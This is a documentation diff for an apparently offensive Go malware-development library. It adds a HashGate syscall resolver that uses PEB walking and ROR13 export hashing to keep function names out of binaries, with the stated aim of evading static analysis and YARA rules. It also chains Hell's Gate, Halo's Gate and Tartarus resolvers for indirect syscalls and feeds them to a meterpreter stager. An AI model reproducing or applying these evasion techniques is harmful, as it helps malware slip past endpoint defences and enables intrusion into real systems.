@@ -149,19 +149,38 @@ resolver := wsyscall.NewTartarus()
 
 Extends Halo's Gate by recognizing JMP-hook patches and extracting the original SSN from the hook displacement. Currently delegates to `HalosGateResolver` (the JMP-displacement analysis is not yet implemented).
 
+### HashGateResolver
+
+```go
+resolver := wsyscall.NewHashGate()
+```
+
+**How it works:** Resolves NT function addresses via PEB walk and ROR13 export hashing instead of `ntdll.NewProc(name)`. This avoids using any string-based function resolution — the binary contains only `uint32` hashes, not function names like `"NtAllocateVirtualMemory"`.
+
+1. Walks the PEB `InLoadOrderModuleList` to find ntdll by hashing each module's `BaseDllName` (UTF-16LE) with ROR13+null.
+2. Parses ntdll's PE export directory in-memory, hashing each export name with ROR13.
+3. Once the function address is found, extracts the SSN from the prologue using the same Hell's Gate pattern (`4C 8B D1 B8`).
+
+The ntdll base address is cached after the first resolution for performance.
+
+**Limitation:** Like Hell's Gate, fails if the target function's prologue is hooked. Combine with `HalosGate` or `TartarusGate` via `Chain` for resilience.
+
+**When to use:** When plaintext NT function names in the binary are a concern (static analysis, YARA rules). The binary will contain only `uint32` hash constants instead of readable strings.
+
 ### ChainResolver
 
 ```go
 resolver := wsyscall.Chain(
-    wsyscall.NewHellsGate(),
-    wsyscall.NewHalosGate(),
-    wsyscall.NewTartarus(),
+    wsyscall.NewHashGate(),   // try PEB walk + hash first (no strings)
+    wsyscall.NewHellsGate(),  // fallback: string-based resolution
+    wsyscall.NewHalosGate(),  // fallback: neighbor scanning
+    wsyscall.NewTartarus(),   // fallback: JMP hook analysis
 )
 ```
 
 **Purpose:** Tries each resolver in order. Returns the first successful result.
 
-**Why:** Provides resilience. If Hell's Gate fails (function hooked), Halo's Gate can recover via neighbor scanning. If Halo's Gate also fails (all neighbors hooked), Tartarus can try JMP displacement analysis.
+**Why:** Provides resilience. If HashGate fails (PEB walk issue), Hell's Gate resolves by name. If that fails (function hooked), Halo's Gate recovers via neighbor scanning. If all neighbors are hooked, Tartarus tries JMP displacement analysis.
 
 ---
 
@@ -230,14 +249,16 @@ status, err := caller.Call("NtProtectVirtualMemory",
 )
 ```
 
-### Example 3: Indirect Syscall with Chained Resolvers (Maximum Stealth)
+### Example 3: Indirect Syscall with HashGate (No Strings in Binary)
 
 ```go
 import wsyscall "github.com/oioio-space/maldev/win/syscall"
 
+// HashGate resolves NT functions via PEB walk + ROR13 hash comparison.
+// The binary contains zero plaintext function names — only uint32 hashes.
 caller := wsyscall.New(
     wsyscall.MethodIndirect,
-    wsyscall.Chain(wsyscall.NewHellsGate(), wsyscall.NewHalosGate()),
+    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()),
 )
 
 // Pass to any technique package
@@ -262,6 +283,23 @@ stager := meterpreter.NewStager(&meterpreter.Config{
     Port:      "4444",
     Caller:    caller, // VirtualAlloc/Protect/CreateThread go through indirect syscalls
 })
+```
+
+### Example 5: Standalone API Hashing (PEB Walk)
+
+```go
+import "github.com/oioio-space/maldev/win/api"
+
+// Resolve any function by hash — no string in binary
+addr, err := api.ResolveByHash(api.HashKernel32, api.HashLoadLibraryA)
+
+// Or step by step:
+ntdllBase, _ := api.ModuleByHash(api.HashNtdll)
+ntAllocAddr, _ := api.ExportByHash(ntdllBase, api.HashNtAllocateVirtualMemory)
+
+// Pre-computed constants match hash.ROR13 / hash.ROR13Module:
+//   api.HashKernel32 = hash.ROR13Module("KERNEL32.DLL") = 0x50BB715E
+//   api.HashLoadLibraryA = hash.ROR13("LoadLibraryA") = 0xEC0E4E8E
 ```
 
 ---
